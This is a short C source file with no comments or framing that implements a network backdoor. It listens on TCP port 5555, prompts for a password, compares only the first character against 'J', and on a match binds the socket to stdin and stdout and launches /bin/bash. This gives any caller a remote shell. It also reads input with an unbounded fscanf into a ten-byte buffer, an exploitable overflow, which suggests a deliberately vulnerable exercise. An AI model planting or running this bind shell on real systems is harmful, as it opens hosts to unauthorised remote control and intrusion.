#define _GNU_SOURCE 1
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/user.h>

#define PASSWORD "J"

int sockfd;
void get_network_conn()
{
  struct sockaddr_in servaddr;
  int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
  int ret_fd, optval = 1;

  bzero( &servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htons(INADDR_ANY);
  servaddr.sin_port = htons(5555);
  setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

  bind(listen_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));
  listen(listen_fd, 0);
  sockfd = accept(listen_fd, (struct sockaddr*) NULL, NULL);
  close(listen_fd);
}

int main(void)
{
  char * password = PASSWORD;
  char input[10];
  FILE * fp;
  int bah;

  get_network_conn();
  fp = fdopen(sockfd, "r+");

  fprintf(fp, "Please enter the password:\n");
  fflush(fp);
  fscanf(fp, "%s", input);

  if(input[0] == password[0])
  {
    write(sockfd, "Password correct, starting access shell...\n", 43);
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    execl("/bin/bash", "/bin/bash", NULL);
  }

  exit(0);
}

